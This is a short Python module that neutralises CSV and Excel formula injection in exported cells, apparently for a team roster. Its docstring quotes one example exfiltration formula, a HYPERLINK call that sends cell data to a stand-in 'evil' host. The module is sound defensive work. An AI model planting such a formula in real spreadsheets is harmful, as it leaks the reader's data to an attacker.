"""Cell values safe to open in a spreadsheet (CSV / Excel formula injection).

A text starting with ``=``, ``+``, ``-``, ``@``, a tab or a carriage return is
read as a formula by Excel and LibreOffice: a squad name or an absence reason
typed as ``=HYPERLINK("http://evil/?"&A1)`` would run on the reader's machine.
Such a value is written with a leading apostrophe, which shows it as text.
"""
from __future__ import annotations

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """The value for a CSV cell: text that would start a formula is quoted with an
    apostrophe; numbers and everything else pass unchanged."""
    if isinstance(value, str) and value.startswith(_TRIGGERS):
        return "'" + value
    return value


def cell_safe(value):
    """Same rule for an openpyxl cell value (a leading "=" there is a formula)."""
    return csv_safe(value)


def row_safe(values) -> list:
    """A whole CSV row, each cell through csv_safe."""
    return [csv_safe(v) for v in values]


def neutralize_workbook(wb):
    """Before saving a generated workbook: every cell openpyxl took for a formula
    (a text starting with "=") is stored as plain text instead. The text stays
    exactly what was typed, so a re-import reads the same name back."""
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if c.data_type == "f":
                    c.data_type = "s"
    return wb
